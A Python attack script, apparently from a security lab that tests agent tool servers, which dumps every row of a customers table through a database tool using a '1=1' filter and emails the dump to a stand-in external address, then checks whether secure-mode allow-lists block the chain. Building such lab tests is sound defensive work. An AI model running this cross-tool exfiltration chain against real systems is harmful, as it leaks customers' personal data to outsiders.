"""Attack 3 Layer A: dump customers via db_tool, email full dump to external sink.

Vuln mode: both steps succeed (MailHog receives external recipient).
Secure mode: email domain allow-list and/or missing customer_id blocks chain.
"""
from __future__ import annotations

import json
import sys

import httpx

from attacks.m01.common import (
    DB_TOOL_URL,
    EMAIL_TOOL_URL,
    MAILHOG_API,
    AttackResult,
    exit_for_result,
    invoke_tool,
    tool_secure_mode,
)

EXTERNAL_TO = "audit@external-logging.test"
SUBJECT = "Customer Export Lab M01"


def run() -> AttackResult:
    secure = tool_secure_mode(DB_TOOL_URL)
    evidence: dict = {}

    dump_ok = False
    rows = []
    try:
        data = invoke_tool(DB_TOOL_URL, {"table": "customers", "filter": "1=1"})
        evidence["db"] = data
        body = data.get("result") or {}
        if not body.get("error"):
            rows = body.get("rows") or []
            dump_ok = len(rows) >= 1
    except Exception as e:
        evidence["db_exception"] = str(e)

    email_ok = False
    try:
        body_text = json.dumps(rows, default=str)[:8000]
        data = invoke_tool(
            EMAIL_TOOL_URL,
            {
                "to": EXTERNAL_TO,
                "subject": SUBJECT,
                "body": body_text or "exfil-attempt",
            },
        )
        evidence["email"] = data
        result_body = data.get("result") or {}
        if result_body.get("error"):
            evidence["email_error"] = result_body["error"]
        else:
            email_ok = bool(result_body.get("sent"))
    except Exception as e:
        evidence["email_exception"] = str(e)

    mailhog_seen = False
    if email_ok:
        try:
            mh = httpx.get(f"{MAILHOG_API}/api/v2/messages", timeout=10.0)
            mh.raise_for_status()
            items = mh.json().get("items") or []
            for item in items:
                headers = item.get("Content", {}).get("Headers", {})
                subjects = headers.get("Subject") or []
                tos = headers.get("To") or []
                if any(SUBJECT in s for s in subjects) or any(EXTERNAL_TO in t for t in tos):
                    mailhog_seen = True
                    break
            evidence["mailhog_seen"] = mailhog_seen
        except Exception as e:
            evidence["mailhog_exception"] = str(e)

    # Full chain: data access + external email.
    success = dump_ok and email_ok
    if secure:
        blocked = not success
        detail = (
            "Secure mode blocked cross-tool exfil chain"
            if blocked
            else "Secure mode FAILED to block exfil"
        )
        detail += f" (dump={dump_ok}, email={email_ok})"
    else:
        blocked = False
        detail = (
            f"Exfil chain landed (dump={dump_ok}, email={email_ok}, mailhog={mailhog_seen})"
            if success
            else f"Exfil chain incomplete (dump={dump_ok}, email={email_ok})"
        )

    return AttackResult(
        attack_id="a3_cross_tool_exfil",
        name="Cross-tool exfiltration",
        layer="A",
        secure_mode=secure,
        success=success,
        blocked=blocked if secure else False,
        detail=detail,
        evidence=evidence,
    )


if __name__ == "__main__":
    try:
        exit_for_result(run())
    except Exception as e:
        print(f"Infrastructure error: {e}", file=sys.stderr)
        sys.exit(2)
